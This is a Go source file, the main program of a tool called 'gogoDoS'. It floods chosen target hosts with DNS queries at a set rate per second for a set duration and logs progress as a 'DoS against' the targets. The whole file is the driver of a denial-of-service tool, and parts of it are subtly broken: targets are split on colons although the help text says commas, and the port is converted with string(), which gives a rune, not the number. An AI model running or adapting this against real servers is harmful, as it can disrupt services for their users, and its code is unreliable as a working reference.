package main

import (
	"flag"
	"log"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
	"gogoDoS/channels/channelman"
	"gogoDoS/protocols/dnsproto"
	//"gogoDoS/protocols/dnsproto/dnsstat"
	//"code.google.com/p/go.net/ipv4"
)

var protoFlag = flag.String("p", "", "Specify protocol to use for DoS")
var destPort = flag.Int("P", 53, "Specify destination port for DoS")
var destIPs = flag.String("d", "", "Specify an single host or a list of hosts seperated by comma (example: 1.2.3.4 or 1.2.3.4,2.3.4.5)")
var rateFlag = flag.Int("r", 1, "Specify the amount of protocol requests per second")
var durationFlag = flag.Int("D", 60, "Specify the total duration of the test")
var interfaceFlag = flag.String("i", "", "Specify which interface name to eject packets from (raw packets only)")

func main() {
	cm := new(channelman.ChannelMan)
	cm.Init()

	runtime.GOMAXPROCS(runtime.NumCPU())
	var runCounter int
	runCounter = 0
	var queryCounter int
	queryCounter = 0
	wg := new(sync.WaitGroup)

	flag.Parse()
	log.Printf("Starting DoS against %s on Port %d via protocol %s at rate %d/s", *destIPs, *destPort, *protoFlag, *rateFlag)
	config := new(dns.ClientConfig)
	config.Servers = strings.Split(*destIPs, ":")
	config.Port = string(*destPort)
	config.Ndots = 1
	config.Timeout = 1
	config.Attempts = 1
	ticker := time.NewTicker(time.Second * 1)

	go func() {
		for {
			select {
			case val := <-cm.RunChannel:
				if val == true {
					queryCounter = queryCounter + 1
				} else if val == false {
					log.Println("FALSE")
				}
			case val := <-cm.StatsChannel:
				log.Println(*val)
			}
		}
	}()

	for t := range ticker.C {
		log.Println(t)
		runCounter = runCounter + 1
		for i := 0; i < *rateFlag; i++ {
			wg.Add(1)
			go dnsproto.DnsQuery(wg, config, queryCounter, cm)
		}
		if runCounter == *durationFlag {
			cm.RunChannel <- false
			wg.Wait()
			log.Printf("Completed %d queries over %d runs to %s", queryCounter, runCounter, *destIPs)
			break
		}
	}

}
